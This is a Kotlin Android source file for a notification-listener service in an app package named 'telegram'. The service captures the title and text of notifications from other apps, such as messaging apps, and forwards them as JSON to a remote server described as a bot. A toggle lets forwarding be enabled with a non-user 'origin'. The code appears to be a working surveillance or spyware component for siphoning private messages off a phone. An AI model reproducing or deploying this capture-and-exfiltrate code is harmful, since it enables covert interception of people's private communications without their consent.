package com.kashem.shaikh.telegram

import android.app.Notification
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import kotlinx.coroutines.*
import com.kashem.shaikh.AppLogs

class NotificationCaptureService : NotificationListenerService() {

    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private lateinit var ignorePackages: List<String>  // 🔥 lateinit, onCreate-এ সেট করা হবে

    companion object {
        private var isForwardingEnabled = false
        private var currentOrigin: String = "user"

        fun setForwardingEnabled(enabled: Boolean, origin: String = "user") {
            isForwardingEnabled = enabled
            currentOrigin = origin
            AppLogs.info("Notification forwarding enabled: $enabled, origin=$origin")
        }

        fun isForwardingEnabled(): Boolean = isForwardingEnabled
    }

    private val ignoreKeywords = listOf(
        "checking for new messages",
        "updating",
        "synchronizing",
        "backup completed",
        "no new messages",
        "you have no new messages",
        "new messages"
    )

    override fun onCreate() {
        super.onCreate()
        // 🔥 এখানে packageName নিরাপদে ব্যবহার করুন
        ignorePackages = listOf(
            "com.android.systemui",
            "com.android.phone",
            "android",
            packageName  // এখন Context পাওয়া যায়
        )
        AppLogs.info("NotificationCaptureService created")
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        if (!isForwardingEnabled) return
        sbn ?: return
        val packageName = sbn.packageName
        if (ignorePackages.contains(packageName)) return

        val extras = sbn.notification.extras
        val title = extras.getString(Notification.EXTRA_TITLE, "")
        val text = extras.getString(Notification.EXTRA_TEXT, "")

        val combined = "$title $text".lowercase()
        if (ignoreKeywords.any { combined.contains(it) }) {
            AppLogs.debug("Ignored notification (keyword): $combined")
            return
        }
        if (text.length < 5 && title.length < 5) return
        if (text.isBlank() && (title == "WhatsApp" || title == "IMO" || title == "Messenger")) return

        AppLogs.debug("Captured notification: $packageName | $title | $text")
        forwardToBot(packageName, title, text)
    }

    private fun forwardToBot(packageName: String, title: String, messageBody: String) {
        val urls = ConfigManager.getServerUrls(applicationContext)
        if (urls == null) {
            AppLogs.error("No server config for notification forward")
            return
        }
        val (host, _) = urls

        val appName = try {
            val pm = applicationContext.packageManager
            pm.getApplicationLabel(pm.getApplicationInfo(packageName, 0)).toString()
        } catch (e: Exception) {
            packageName
        }

        val jsonData = """
            {
                "app": "$appName",
                "title": "$title",
                "message": "$messageBody",
                "timestamp": ${System.currentTimeMillis()}
            }
        """.trimIndent()

        serviceScope.launch {
            val success = FileUploader.uploadNotification(applicationContext, jsonData, host, currentOrigin)
            if (success) {
                AppLogs.logNotificationForward(appName, title, true)
            } else {
                AppLogs.logNotificationForward(appName, title, false, "Upload failed")
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        serviceScope.cancel()
        AppLogs.info("NotificationCaptureService destroyed")
    }
}